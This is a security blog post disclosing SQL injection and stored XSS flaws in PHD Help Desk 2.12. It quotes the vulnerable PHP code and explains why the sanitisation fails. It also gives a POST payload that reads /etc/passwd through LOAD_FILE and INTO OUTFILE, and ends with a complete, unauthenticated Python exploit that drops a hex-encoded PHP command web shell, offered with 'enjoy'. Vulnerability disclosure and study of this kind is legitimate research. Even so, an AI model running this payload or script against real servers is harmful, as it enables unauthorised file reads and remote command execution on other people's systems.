---
categories:
- sqli
- xss
- phd
comments: false
date: "2013-06-02T22:55:27Z"
title: PHD Help Desk 2.12 - SQLi/XSS
---

[PHD Help Desk](http://www.p-hd.com.ar/) is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I'll try and go through a couple, but there are so many it's sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it's definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.

The first place we'll start is `login.php`, which tellingly holds all of the login logic.  Here's the relevant bit:

```
$operador=trim(strip_tags($_POST[operador]));
$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador'";
$result=mysql_query($query) or die(mysql_error());
$q_filas=mysql_num_rows($result);

if($q_filas!=1)
       {$mensaje=$Oper_not_autorized;
        require($Include.'login.inc');
        exit();
       }

### Ahora verifico la contraseña
$md5_contrasenia=md5($_POST['contrasenia']);

$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador' AND contrasenia='$md5_contrasenia'";
$result=mysql_query($query) or die (mysql_error());;
$q_filas=mysql_num_rows($result);

if ($q_filas!=1)
             {$mensaje=$Invalid_passwd;
             require($Include.'login.inc');
             exit();
            }

$data=mysql_fetch_array($result);
if ($data['nivel']<1)
               {$mensaje=$Oper_not_autorized;
                require($Include.'login.inc');
                exit();
               }
```

This doesn't even really try to sanitize anything.  [strip_tags](http://php.net/manual/en/function.strip-tags.php) is used to remove HTML and PHP tags from a string, and [trim](http://php.net/manual/en/function.trim.php) strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5's it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple `' OR '1=1`, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we'll just use the username to run malicious queries.

Submitting the following POST data to login.php will dump `/etc/passwd`

```
operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&contrasenia=asdf&submit=Enter&captcha=
```

{{< figure class="center" src="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg" >}}

With this, we can naturally obtain a web shell, as demonstrated by the exploit code I've developed:

```
root@jali:~# python phd_sqli.py -h
usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]

optional arguments:
  -h, --help  show this help message and exit
  -i IP       server address
  -p ROOTP    path to login.php (/phd_2_12)
  -w PATH     writable web path (/var/www/phd_2_12) for shell
root@jali:~# python phd_sqli.py -i 192.168.1.83
[!] Dropping web shell on 192.168.1.83...
[!] Shell dropped.  http://192.168.1.83/phd_2_12/0m05k.php?rr=ls
root@jali:~# 
```
As a note, `strip_slashes` prevents us from submitting anything that includes HTML or PHP tags in it. So I've gotten around that by simply hex encoding the string:

```
# <? php system($_GET["rr"]); ?>
data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
                                     ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
                                     ' \'{0}/{1}.php'.format(options.path,shell)),
                         'contrasenia':'pass',
                         'submit':'Enter',
                         'captcha':''})
```

There's another SQLi vulnerability in `abro_adjunto.php`, which requires authentication to the application:

```
if (isSet($_GET['file']))

    {$query="SELECT *
             FROM {$MyPHD}sigo_ticket
             WHERE seq_sigo_ticket_id={$_GET['file']} ";
             
     $result=mysql_query($query) or die (mysql_error());
     
     $row = mysql_fetch_array($result);

     $tipo_adjunto = $row['tipo_adjunto'];
     $adjunto = $row['adjunto'];
     $nombre_adjunto = $row['nombre_adjunto'];

     if(strlen($nombre_adjunto)>1)
        {header("Content-type: $tipo_adjunto");
         header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
         echo $adjunto;
        }
     else
        {require('head.inc');
         echo "<div class='error'>INVALID CALL </div>";
        }
    }
```

And the sanitization for this (and most files, really) is as follows:

```
if (get_magic_quotes_gpc())
    { foreach($_GET as $clave => $valor)
      {$_GET[$clave]=stripslashes($_GET[$clave]);
      }
    }

foreach($_GET as $clave => $valor)
     {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
     }
```

[htmlentities](http://php.net/manual/en/function.htmlentities.php), when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn't even use quotes, thus there is nothing to escape.

There's stored XSS within all Attributes (Contact, Process, State, Type) that's loaded when viewing users:

{{< figure class="center" src="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg" >}}

Here's the code for dropping a web shell; enjoy:

```
# Exploit Title: PHD Help Desk 2.12 SQLi
# Date: 05/24/2013
# Exploit Author: drone (@dronesec)
# Vendor Homepage: http://www.p-hd.com.ar/
# Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
# Version: 2.12
# Tested on: Ubuntu 12.04 (apparmor disabled)

""" This app is so full of SQLi & XSS; if you're looking for
    practice with real web apps, this is a good place to go.

    You don't need auth for this.
    @dronesec
"""
from argparse import ArgumentParser
import string
import random
import urllib, urllib2
import sys

def run(options):
    print '[!] Dropping web shell on %s...'%(options.ip)

    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

    # <? php system($_GET["rr"]); ?>
    data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
                                    ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
                                        ' \'{0}/{1}.php'.format(options.path,shell)),
                             'contrasenia':'pass',
                             'submit':'Enter',
                             'captcha':''})

    urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
    print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)

def parse():
    parser = ArgumentParser()
    parser.add_argument('-i',help='server address',action='store',dest='ip')
    parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
                default='/phd_2_12', dest='rootp')
    parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
                default='/var/www/phd_2_12/', action='store', dest='path')

    options = parser.parse_args()
    if not options.ip:
        parser.print_help()
        sys.exit(1)

    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
    return options

if __name__=="__main__":
    run(parse())
```

[Exploit](http://www.exploit-db.com/exploits/25915/)
